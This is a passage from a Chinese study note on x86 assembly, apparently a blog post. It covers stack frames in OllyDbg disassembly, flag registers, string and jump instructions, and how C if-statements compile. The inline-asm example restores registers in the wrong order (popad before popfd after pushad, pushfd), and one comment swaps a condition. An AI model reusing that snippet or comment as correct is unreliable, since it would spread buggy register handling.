class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">;现在到了一个新的函数，需要有自己的栈底，因此需要把上一个栈底保存起来，栈顶不用保存，因为栈顶是新函数的栈底</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">;堆栈提升</span><br><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br><span class=\"line\">;保护现场，为了retn后回恢复</span><br><span class=\"line\">00401069  |.  8D7D B8       lea     edi,[local.18]</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">;初始化堆栈，防止脏数据</span><br><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     [local.1],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,[local.2]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,[local.1]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">;形参压入栈中</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">;调用add函数</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">;堆栈平衡，将esp带回call以前的位置，call之前push了两次，2*4=8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\">;嗲用printf函数，操作和上面调用add一样</span><br><span class=\"line\">004010A0  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">;堆栈平衡</span><br><span class=\"line\">004010A3  |.  33C0          xor     eax,eax</span><br><span class=\"line\">004010A5  |.  5F            pop     edi</span><br><span class=\"line\">004010A6  |.  5E            pop     esi</span><br><span class=\"line\">004010A7  |.  5B            pop     ebx</span><br><span class=\"line\">;恢复现场</span><br><span class=\"line\">004010A8  |.  83C4 48       add     esp,0x48</span><br><span class=\"line\">004010AB  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">004010AD  |.  E8 9E000000   call    _chkesp</span><br><span class=\"line\">004010B2  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">004010B4  |.  5D            pop     ebp</span><br><span class=\"line\">004010B5  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>分配堆栈向下减少。堆栈传递参数向上相加</p>\n<h4 id=\"堆栈结构图重点\"><a class=\"markdownIt-Anchor\" href=\"#堆栈结构图重点\">#</a> 堆栈结构图（重点）</h4>\n<ol>\n<li>调用 CALL 又可以分为六个部分：</li>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>执行实际内容</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<h3 id=\"如何右键启动od\"><a class=\"markdownIt-Anchor\" href=\"#如何右键启动od\">#</a> 如何右键启动 od</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181646294.png\" alt=\"image-20221108181646294\"></p>\n<p>通过以上方式右键启动 od</p>\n<h3 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108181822816.png\" alt=\"image-20221108181822816\"></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108193731856.png\" alt=\"image-20221108193731856\" style=\"zoom:80%;\" />\n<ol>\n<li>进位标志 CF (Carry Flag)</li>\n<li>奇偶标志 PF (Parity  Flag)</li>\n<li>辅助进位标志 AF (Auxiliary  Carry Flag)</li>\n<li>零标志 ZF (Zero  Flag)</li>\n<li>符号标志 SF (Sign  Flag)</li>\n<li>溢出标志 OF (Overflow  Flag)</li>\n<li>方向标志 DF (Direction Flag)</li>\n</ol>\n<h4 id=\"进位标志cfcarry-flag\"><a class=\"markdownIt-Anchor\" href=\"#进位标志cfcarry-flag\">#</a> 进位标志 CF (Carry Flag)</h4>\n<p>如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为 1，否则其值为 0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"奇偶标志pfparity-flag\"><a class=\"markdownIt-Anchor\" href=\"#奇偶标志pfparity-flag\">#</a> 奇偶标志 PF (Parity Flag)</h4>\n<p>奇偶标志 PF 用于反映运算结果中<strong>最低有效字节</strong>中 “1” 的个数的奇偶性，如果 “1” 的个数为偶数，则 PF 的值为 1，否则其值为 0。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AX,803</span><br><span class=\"line\">ADD AX,1</span><br><span class=\"line\">0x804: 0000 1000 0000 0100        总共2个1 ,PF应为1，但实际运行结果PF为0</span><br><span class=\"line\">因为PF是根据最低有效字节来看，即804后面04的这部分</span><br></pre></td></tr></table></figure>\n<h4 id=\"辅助进位标志afauxiliary-carry-flag\"><a class=\"markdownIt-Anchor\" href=\"#辅助进位标志afauxiliary-carry-flag\">#</a> 辅助进位标志 AF (Auxiliary Carry Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：</span><br><span class=\"line\"></span><br><span class=\"line\">在字操作时，发生低字节向高字节进位或借位时</span><br><span class=\"line\">在字节操作时，发生低4位向高4位进位或借位时</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>AF 与<strong>数据宽度</strong>相关</p>\n<p>32 位时 FFFF <strong>F</strong> FFF</p>\n<p>16 位时 FF <strong>F</strong> F</p>\n<p>8 位时 F <strong>F</strong></p>\n<p>加黑的字体为 AF 标志位判断的位置，如果该位置要向前进位则 AF 为 1，否则为 0，和 CF 相似，不过判断的位置不同</p>\n</blockquote>\n<h4 id=\"零标志zfzero-flag\"><a class=\"markdownIt-Anchor\" href=\"#零标志zfzero-flag\">#</a> 零标志 ZF (Zero Flag)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">零标志ZF用来反映运算结果是否为0</span><br><span class=\"line\">如果运算结果为0，则其值为1，否则其值为0</span><br><span class=\"line\">作用：在判断运算结果是否为0时，可使用此标志位</span><br><span class=\"line\">XOR EAX,EAX   //通过xor将eax清零，会改变zf标志位为1</span><br><span class=\"line\">MOV EAX,0     //通过MOV将EAX赋值为0，非运算，不改变zf标志位</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"符号标志sfsign-flag\"><a class=\"markdownIt-Anchor\" href=\"#符号标志sfsign-flag\">#</a> 符号标志 SF (Sign Flag)</h4>\n<blockquote>\n<p>符号标志 SF 用来反映运算结果的符号位，它与运算结果的最高位相同</p>\n</blockquote>\n<h4 id=\"溢出标志ofoverflow-flag\"><a class=\"markdownIt-Anchor\" href=\"#溢出标志ofoverflow-flag\">#</a> 溢出标志 OF (Overflow Flag)</h4>\n<blockquote>\n<p>溢出标志 OF 用于反映有符号数加减运算所得结果是否溢出</p>\n<p>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</p>\n<p>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</p>\n<ul>\n<li>正 + 正 = 正 如果结果是负数，则说明有溢出</li>\n<li>负 + 负 = 负 如果结果是正数，则说明有溢出</li>\n<li>正 + 负 永远都不会有溢出</li>\n</ul>\n<p>CPU 如何计算 OF</p>\n<ul>\n<li>符号位有进位</li>\n<li>最高有效数值位向符号位产生的进位</li>\n</ul>\n<p>对于一个有符号数：如 0x80 和 0xC0</p>\n<p>符号位有进位</p>\n<p>0x80:<strong>1</strong> 000 0000</p>\n<p>0xC0:<strong>1</strong> 100 0000</p>\n<p>最高有效数值位向符号位产生的进位</p>\n<p>0x80:1 <strong>0</strong> 00 0000</p>\n<p>0xC0:1 <strong>1</strong> 00 0000</p>\n<p>就是运算 0x80+0xc0</p>\n<p>0x80:<strong>1</strong> <strong>0</strong> 00 0000</p>\n<p>0xC0:<strong>1</strong> <strong>1</strong> 00 0000</p>\n<p>符号位 1+1 有产生进位，于是符号位有进位为 1</p>\n<p>最高有效数值位向符号位产生的进位 0+1 没有产生进位，于是最高有效数值位向符号位产生的进位为 0</p>\n<p><strong>OF = 符号位有进位 xor 最高有效数值位向符号位产生的进位</strong></p>\n<p>OF = 1 xor 0 = 1 所以此时 OF=1</p>\n</blockquote>\n<h4 id=\"方向标志dfdirection-flag\"><a class=\"markdownIt-Anchor\" href=\"#方向标志dfdirection-flag\">#</a> 方向标志 DF (Direction Flag)</h4>\n<blockquote>\n<p>DF=1 时串操作为减地址方式 DF=0 为增地址方式</p>\n</blockquote>\n<h3 id=\"相关汇编指令\"><a class=\"markdownIt-Anchor\" href=\"#相关汇编指令\">#</a> 相关汇编指令</h3>\n<blockquote>\n<p>ADC 指令：带进位加法</p>\n<p>SBB 指令：带借位减法</p>\n<p>XCHG 指令：交换数据</p>\n<p>格式：XCHG R/M,R/M 两边不能同时为内存  <strong>数据宽度</strong>要一样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV AL,1</span><br><span class=\"line\">MOV CL,2</span><br><span class=\"line\">XCHG AL,CL</span><br><span class=\"line\">执行前：AL=1 CL=2</span><br><span class=\"line\">执行后：AL=2 CL=1</span><br></pre></td></tr></table></figure>\n<p>MOVS 指令：移动数据 内存 - 内存</p>\n<p>MOVS 指令常用于复制字符串</p>\n<p>可以将不同宽度的指令简写为 movsb movsw movsd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV EDI,12FFD8</span><br><span class=\"line\">MOV ESI,12FFD0</span><br><span class=\"line\">MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]</span><br><span class=\"line\">EDI内存里的值被修改为ESI内存里的值，且EDI和ESI各加4,和DOWRD数据宽度相关，如果为WORD 则各加2</span><br><span class=\"line\">由DF（Direction Flag）方向标志位决定，当DF位为1时为减，当DF位为0时，则为加</span><br></pre></td></tr></table></figure>\n<p>movsx 操作数 A，操作数 B  符号扩展传送</p>\n<p>movzx 零扩展传送</p>\n<p>movsx，movzx 操作数 A 的空间必须大于操作数 b</p>\n<p>如果大的给小的，会产生截断</p>\n<p>STOS 指令</p>\n<p>将 Al/AX/EAX 的值存储到 [EDI] 指定的内存单元，和<strong>数据宽度</strong>相关</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">STOS BYTE PTR ES:[EDI]                将AL存储到[EDI]</span><br><span class=\"line\">STOS WORD PTR ES:[EDI]                将AX存储到[EDI]</span><br><span class=\"line\">STOS DWORD PTR ES:[EDI]                将EAX存储到[EDI]</span><br><span class=\"line\">注意这里使用的是ES</span><br><span class=\"line\">当后面为[EDI]时要使用ES</span><br><span class=\"line\">存储完数据后EDI地址的变化方向也受DF标志控制，1减0增</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">现在在看看这几行代码，先把eax的值变为cccccccc，stos将其存储到es中，通过rep循环存储</span><br></pre></td></tr></table></figure>\n<p>REP 指令</p>\n<p>按计数寄存器 (ECX) 中指定的次数重复执行指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV ECX,10</span><br><span class=\"line\">REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]        也可以写成REP MOVSD</span><br><span class=\"line\">代码将会重复执行16次</span><br><span class=\"line\">因为每执行一次EDI和ESI都会变化4，变化方向由DF决定</span><br></pre></td></tr></table></figure>\n<p>LEA 指令</p>\n<p>地址传送指令</p>\n<p>将操作数 B 的有效地址传送到指定的某个寄存器，操作数 A 必须是寄存器</p>\n</blockquote>\n<h3 id=\"跳转和比较指令\"><a class=\"markdownIt-Anchor\" href=\"#跳转和比较指令\">#</a> 跳转和比较指令</h3>\n<h4 id=\"jcc指令\"><a class=\"markdownIt-Anchor\" href=\"#jcc指令\">#</a> JCC 指令</h4>\n<blockquote>\n<p>cc 代表 condition code (状态码)</p>\n<p>Jcc 不是单个指令，它只是描述了跳转之前检查条件代码的跳转助记符</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031210918994.png\" alt=\"image-20221031210918994\" style=\"zoom: 50%;\" />\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MucHJpbmNldG9uLmVkdS9jb3Vyc2VzL2FyY2hpdmUvZmFsbDEyL2NvczM3NS9JQTMySmNjLnBkZg==\">https://www.cs.princeton.edu/courses/archive/fall12/cos375/IA32Jcc.pdf</span></p>\n<p>JCC 指令用于改变 EIP（CPU 要读取的指令地址）</p>\n</blockquote>\n<h4 id=\"jmp指令\"><a class=\"markdownIt-Anchor\" href=\"#jmp指令\">#</a> JMP 指令</h4>\n<p>JMP 指令：修改 EIP 的值</p>\n<p>JMP 指令只影响了 EIP，不影响堆栈和其它通用寄存器</p>\n<p>JMP 寄存器 / 立即数相当于 MOV EIP, 寄存器 / 立即数</p>\n<h4 id=\"call指令\"><a class=\"markdownIt-Anchor\" href=\"#call指令\">#</a> CALL 指令</h4>\n<p>CALL 指令和 JMP 指令都会修改 EIP 的值</p>\n<p>但 CALL 指令会将返回地址（CALL 指令的下一条指令地址）压入堆栈</p>\n<p>因此也会引起 esp 的变化</p>\n<h4 id=\"ret指令\"><a class=\"markdownIt-Anchor\" href=\"#ret指令\">#</a> RET 指令</h4>\n<p>call 调用跳转后执行完相关代码完要返回到 call 的下一条指令时使用 ret 指令</p>\n<p>ret 指令相当于 pop eip</p>\n<h4 id=\"cmp指令\"><a class=\"markdownIt-Anchor\" href=\"#cmp指令\">#</a> CMP 指令</h4>\n<p>指令格式：CMP R/M,R/M/IMM</p>\n<p>CMP 指令只改变标志寄存器的值</p>\n<p>该指令是比较两个操作数，实际上，它相当于 SUB 指令，但是相减的结果并不保存到第一个操作数中</p>\n<p>只是根据相减的结果来改变 ZF 零标志位的，当两个操作数相等的时候，零标志位置 1</p>\n<h4 id=\"test指令\"><a class=\"markdownIt-Anchor\" href=\"#test指令\">#</a> TEST 指令</h4>\n<p>指令格式：TEST R/M,R/M/IMM</p>\n<p>该指令在一定程度上和 CMP 指令时类似的，两个数值进行与操作，结果不保存，但是会改变相应标志位</p>\n<p>常见用法：用这个指令，可以确定某寄存器是否等于 0</p>\n<p>观察 ZF（零标志位）就可以判断 EAX 是否为 0</p>\n<h3 id=\"if指令编译结果\"><a class=\"markdownIt-Anchor\" href=\"#if指令编译结果\">#</a> if 指令编译结果</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a = 1;</span><br><span class=\"line\">\tif (a == 1) &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,11);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;,22);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040D440 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">0040D441  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">0040D443  |.  83EC 44       sub     esp,0x44</span><br><span class=\"line\">0040D446  |.  53            push    ebx</span><br><span class=\"line\">0040D447  |.  56            push    esi</span><br><span class=\"line\">0040D448  |.  57            push    edi</span><br><span class=\"line\">0040D449  |.  8D7D BC       lea     edi,[local.17]</span><br><span class=\"line\">0040D44C  |.  B9 11000000   mov     ecx,0x11</span><br><span class=\"line\">0040D451  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">0040D456  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">//上面都是堆栈提升，初始化堆栈，if从这里开始</span><br><span class=\"line\"></span><br><span class=\"line\">// a=1</span><br><span class=\"line\">0040D458  |.  C745 FC 01000&gt;mov     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">// a==1?a=11:a=22</span><br><span class=\"line\">// 如果a!=1 jmp 0040D476</span><br><span class=\"line\">// 如果a!=1 printf(11) jmp(0040D485)</span><br><span class=\"line\">// jmp(0040D485)就是跳转到if判断结束的地方，继续执行下面的语句</span><br><span class=\"line\">0040D45F  |.  837D FC 01    cmp     dword ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0040D463  |.  75 11         jnz     short 0040D476</span><br><span class=\"line\">0040D465  |.  6A 0B         push    0xB                              ; /&lt;%d&gt; = B (11.)</span><br><span class=\"line\">0040D467  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D46C  |.  E8 4F020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D471  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D474  |.  EB 0F         jmp     short 0040D485</span><br><span class=\"line\">0040D476  |&gt;  6A 16         push    0x16                             ; /&lt;%d&gt; = 16 (22.)</span><br><span class=\"line\">0040D478  |.  68 0C214200   push    0042210C                         ; |format = &quot;%d</span><br><span class=\"line\"></span><br><span class=\"line\">0040D47D  |.  E8 3E020000   call    printf                           ; \\printf</span><br><span class=\"line\">0040D482  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">0040D485  |&gt;  33C0          xor     eax,eax</span><br><span class=\"line\">0040D487  |.  5F            pop     edi</span><br><span class=\"line\">0040D488  |.  5E            pop     esi</span><br><span class=\"line\">0040D489  |.  5B            pop     ebx</span><br><span class=\"line\">0040D48A  |.  83C4 44       add     esp,0x44</span><br><span class=\"line\">0040D48D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040D48F  |.  E8 BC3BFFFF   call    _chkesp</span><br><span class=\"line\">0040D494  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040D496  |.  5D            pop     ebp</span><br><span class=\"line\">0040D497  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"反汇编分析c语言\"><a class=\"markdownIt-Anchor\" href=\"#反汇编分析c语言\">#</a> 反汇编分析 C 语言</h3>\n<p>有了之前画堆栈图的经验，我们不难看出，尽管我们的函数是个空函数，但其汇编代码依然完成了以下流程：</p>\n<ol>\n<li>提升堆栈</li>\n<li>保护现场</li>\n<li>初始化提升的堆栈</li>\n<li>恢复现场</li>\n<li>返回</li>\n</ol>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">提升堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401010</span>   push        ebp</span><br><span class=\"line\"><span class=\"number\">00401011</span>   mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401013</span>   sub         esp,<span class=\"number\">40</span>h</span><br><span class=\"line\">保护现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401016</span>   push        ebx</span><br><span class=\"line\"><span class=\"number\">00401017</span>   push        esi</span><br><span class=\"line\"><span class=\"number\">00401018</span>   push        edi</span><br><span class=\"line\">PS：前面的push        ebp也是保护现场</span><br><span class=\"line\"></span><br><span class=\"line\">初始化提升的堆栈</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401019</span>   lea         edi,[ebp<span class=\"number\">-40</span>h]</span><br><span class=\"line\"><span class=\"number\">0040101</span>C   mov         ecx,<span class=\"number\">10</span>h</span><br><span class=\"line\"><span class=\"number\">00401021</span>   mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">00401026</span>   rep stos    dword ptr [edi]</span><br><span class=\"line\">恢复现场</span><br><span class=\"line\"> 复制代码 隐藏代码</span><br><span class=\"line\"><span class=\"number\">00401028</span>   pop         edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>   pop         esi</span><br><span class=\"line\"><span class=\"number\">0040102</span>A   pop         ebx</span><br><span class=\"line\"><span class=\"number\">0040102</span>B   mov         esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040102</span>D   pop         ebp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221108201930358.png\" alt=\"image-20221108201930358\"></p>\n<h3 id=\"内联汇编\"><a class=\"markdownIt-Anchor\" href=\"#内联汇编\">#</a> 内联汇编</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad   <span class=\"comment\">//通用寄存器入栈</span></span><br><span class=\"line\">\t\tpushfd   <span class=\"comment\">//标志寄存器入栈</span></span><br><span class=\"line\">\t\tmov al,<span class=\"number\">0xff</span></span><br><span class=\"line\">\t\tadd al,<span class=\"number\">1</span> <span class=\"comment\">//C,P,A,Z = 1</span></span><br><span class=\"line\">\t\tpopad</span><br><span 